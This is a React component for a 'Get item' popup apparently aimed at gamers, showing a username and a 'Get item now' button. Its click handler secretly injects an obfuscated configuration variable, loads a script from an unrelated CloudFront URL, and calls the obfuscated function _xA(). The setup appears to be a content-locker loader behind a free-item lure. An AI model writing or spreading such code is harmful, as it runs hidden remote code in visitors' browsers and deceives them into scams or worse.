import { Button } from "@/components/ui/button";

type ConfirmationPopupProps = {
  username: string;
  onGetItemNow: () => void;
};

const ConfirmationPopup = ({ username, onGetItemNow }: ConfirmationPopupProps) => {
  const handleGetItemNow = () => {
    // Inject the first script
    const script1 = document.createElement('script');
    script1.type = 'text/javascript';
    script1.innerHTML = 'var NfflQ_fLA_QqYbsc={"it":4478933,"key":"4fdc9"};';
    document.body.appendChild(script1);

    // Inject the second script and call _xA() after it loads
    const script2 = document.createElement('script');
    script2.src = 'https://d2v7l2267atlz5.cloudfront.net/a4757ee.js';
    script2.onload = function() {
      if (typeof window._xA === 'function') {
        window._xA();
      } else if (typeof _xA === 'function') {
        _xA();
      }
    };
    document.body.appendChild(script2);

    // Call the original callback
    onGetItemNow();
  };

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div className="bg-gray-800 text-white w-80 rounded-lg overflow-hidden shadow-xl animate-fade-in">
        <div className="p-4 border-b border-gray-700">
          <h3 className="text-center text-lg font-medium">Get item</h3>
        </div>
        
        <div className="p-4">
          <div className="flex justify-center mb-4">
            <div className="w-16 h-16 rounded-full bg-yellow-400 flex items-center justify-center">
              <div className="text-2xl">🎮</div>
            </div>
          </div>
          
          <p className="text-center mb-4 text-sm font-medium">@{username}</p>
          
          <Button 
            className="w-full bg-white text-black hover:bg-gray-200"
            onClick={handleGetItemNow}
          >
            Get item now
          </Button>
        </div>
      </div>
    </div>
  );
};

export default ConfirmationPopup;
